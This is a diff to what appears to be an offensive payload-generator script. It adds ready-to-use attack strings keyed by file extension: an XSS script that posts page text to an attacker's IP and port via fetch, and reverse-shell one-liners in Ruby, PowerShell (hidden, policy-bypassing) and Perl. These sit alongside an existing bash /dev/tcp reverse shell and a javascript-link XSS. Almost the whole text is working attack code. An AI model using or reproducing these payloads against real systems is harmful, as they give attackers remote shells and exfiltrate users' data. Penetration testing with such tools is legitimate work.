@@ -81,6 +81,12 @@ def get_payload(extension, ip, port):
                 # Targets Markdown renderers that allow JavaScript links in anchors.
                 # Useful for XSS attacks in browsers or applications with insufficient sanitization.
                 "[Click Me](javascript:alert('Exploit Successful!'))"
+            ),
+            "embedded_script": (
+                # Markdown payload with an embedded script for data exfiltration
+                # This uses JavaScript's `fetch` API to send document content to the attacker's server.
+                # Useful for testing XSS and data exfiltration vulnerabilities.
+                f"<script>\nfetch('http://{ip}:{port}/', {{\n  method: 'POST',\n  body: JSON.stringify({{data: document.body.innerText}}),\n}});\n</script>"
             )
         },
         ".sh": (
@@ -89,8 +95,27 @@ def get_payload(extension, ip, port):
             # It establishes a reverse shell connection to the given IP and port.
             f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
         ),
+        ".rb": (
+            # Ruby payload for reverse shell
+            # Uses Ruby's TCPSocket to establish a reverse shell connection.
+            # Suitable for systems with Ruby installed.
+            f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
+        ),
+        ".ps1": (
+            # PowerShell payload for reverse shell
+            # Targets Windows systems using PowerShell scripting.
+            # Creates a reverse shell connection back to the attacker's machine.
+            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
+        ),
+        ".pl": (
+            # Perl payload for reverse shell
+            # Uses Perl's socket functionality to create a reverse shell connection.
+            # Useful for legacy systems with Perl installed.
+            f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
+        ),
     }
     return payloads.get(extension, f"# No payload available for {extension}")
+
 
 
 def generate_payload():
@@ -119,7 +144,8 @@ def generate_payload():
             "html_xss": "(Embedded XSS using HTML, requires a browser or vulnerable renderer)",
             "code_injection": "(Command injection via a code block, requires user execution)",
             "file_inclusion": "(Local file inclusion using path traversal)",
-            "javascript_link": "(XSS through a JavaScript link, requires user interaction)"
+            "javascript_link": "(XSS through a JavaScript link, requires user interaction)",
+            "embedded_script": "(This uses JavaScript's `fetch` API to send document content to the attacker's server.)"
         }
         print("[!] Available Markdown Exploits:")
         for i, (md_type, description) in enumerate(md_exploit_types.items(), 1):
